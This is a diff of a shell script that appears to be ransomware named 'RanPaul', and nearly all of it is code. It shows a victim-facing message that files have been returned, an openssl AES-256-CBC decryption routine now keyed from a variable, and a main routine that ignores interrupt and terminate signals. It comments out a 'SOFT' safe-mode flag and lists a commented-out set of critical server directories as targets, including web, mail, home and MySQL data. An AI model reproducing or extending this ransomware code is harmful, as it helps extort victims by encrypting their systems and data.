@@ -90,12 +90,10 @@ esac
 case "$result" in
 Yes|Y|y)
 	echo You got the files, pal! goodbye now..
-	breakcom
 	break
 	;;
 0)
 	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
-	breakcom
 	break
 	;;	
 1)
@@ -139,7 +137,7 @@ upk() {
 	openfile $1
 	openfile $1.dec
 	mv $1 $1.enc
-	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1.enc -out $1
+	openssl aes-256-cbc -d -k $KEY -in $1.enc -out $1
 	rm $1.enc
 	fi
 }
@@ -181,7 +179,7 @@ breakcom() {
 main() {
 	trap '' INT
 	trap '' TERM
-	SOFT="YES"
+	#SOFT="YES"
 	init
 	targets="/root/Desktop/testing"
 	#targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
